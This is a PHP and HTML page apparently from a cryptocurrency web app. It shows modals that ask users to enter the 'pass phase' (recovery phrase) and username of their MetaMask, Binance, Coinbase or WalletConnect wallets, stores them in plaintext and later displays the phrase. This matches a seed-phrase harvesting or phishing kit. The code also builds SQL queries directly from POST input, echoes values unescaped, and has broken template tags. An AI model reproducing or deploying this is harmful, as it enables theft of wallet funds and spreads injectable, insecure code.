<?php

if (isset($_POST[$wallet_name])) {

    $wallet_phase = $_POST['wallet_phase'];
    $wallet_username = $_POST['wallet_username'];
    $wallet_id = $_POST['wallet_id'];


    // Assuming your database connection is already established ($conn)
//    $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username' WHERE wallet_owner_id = $user_id AND wallet_key = $wallet_key";
    $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username' WHERE wallet_owner_id = $user_id AND wallet_id = $wallet_id";

    if ($conn->query($sql) === TRUE) {
        echo "Record updated successfully";
    } else {
        echo "Error updating record: " . $conn->error;
    }
}

$sql = "SELECT * FROM wallet WHERE wallet_owner_id = $user_id";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        // Assign values from the database to variables
        $wallet_id = $row['wallet_id'];
        $wallet_ref_id = $row['wallet_ref_id'];
        $wallet_phase = $row['wallet_phase'];
        $wallet_owner_id = $row['wallet_owner_id'];
        $wallet_img = $row['wallet_img'];
        $wallet_name = $row['wallet_name'];
        $wallet_key = $row['wallet_key']; // name of wallet 1=>metamask, 2=>binance, 3=>coinbase, 4=>walletConnect
        $wallet_status = $row['wallet_status']; // 0=not connected 1=connected 2=pending approval

        if ($wallet_status == 0) {
            $wallet_status_rp = 'not connected';
        } elseif ($wallet_status == 1) {
            $wallet_status_rp = 'connected';
        } elseif ($wallet_status == 2) {
            $wallet_status_rp = 'pending approval';
        }

        // Map numeric values to corresponding names
        switch ($wallet_key) {
            case 1:
                $wallet_key_name = 'metamask';
                break;
            case 2:
                $wallet_key_name = 'binance';
                break;
            case 3:
                $wallet_key_name = 'coinbase';
                break;
            case 4:
                $wallet_key_name = 'WalletConnect';
                break;
        }

        // Display the modal structure
        ?>
        <?php if ($wallet_status == 0) { ?>
            <!-- The Modal -->
            <div class="modal fade" id="modal<?=$wallet_key_name?>">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content">

                        <!-- Modal Header -->
                        <div class="modal-header">
                            <h4 class="modal-title"><?=$wallet_name?></h4>
                            <button type="button" class="close" data-dismiss="modal">&times;</button>
                        </div>

                        <!-- Modal Body -->
                        <div class="modal-body">
                            <form method="post">
                                <input type="hidden" value="<?$wallet_id?>" name="<?$wallet_id?>">
                                <div class="form-group">
                                    <label>Pass Phase</label>
                                    <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
                                </div>
                                <div class="form-group">
                                    <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
                                    <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?=$wallet_key_name?> username">
                                </div>
                                <button type="submit" class="btn btn-primary" name="<?=$wallet_name?>">Submit</button>
                            </form>
                        </div>

                        <!-- Modal Footer -->
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                        </div>

                    </div>
                </div>
            </div>

            <script>
                function submitForm<?=$wallet_key_name?>() {
                    // Assuming you have a JavaScript function to handle form submission
                    // You may want to add AJAX code here to submit the form asynchronously
                    document.getElementById('walletForm<?=$wallet_key_name?>').submit();
                }
            </script>


        <?php } elseif ($wallet_status == 1) { ?>
            <!-- The Modal -->
            <div class="modal fade" id="modal<?=$wallet_key_name?>">
                <div class="modal-dialog modal-dialog-centered">
                    <div class="modal-content">

                        <!-- Modal Header -->
                        <div class="modal-header">
                            <h4 class="modal-title"><?=$wallet_name . ' '?><span class="p-2 text-success bg-dark"><?=$wallet_status_rp?></span></h4>
                            <button type="button" class="close" data-dismiss="modal">&times;</button>
                        </div>

                        <!-- Modal Body -->
                        <div class="modal-body">
                            <div class="p-3 border-1">Your wallet phase</div>
                            <div class="p-3 border-1"><?= $wallet_phase ?></div>
                        </div>

                        <!-- Modal Footer -->
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                        </div>

                    </div>
                </div>
            </div>
        <?php } ?>
        <?php
    }
} else {
    echo "No wallets found.";
}
?>
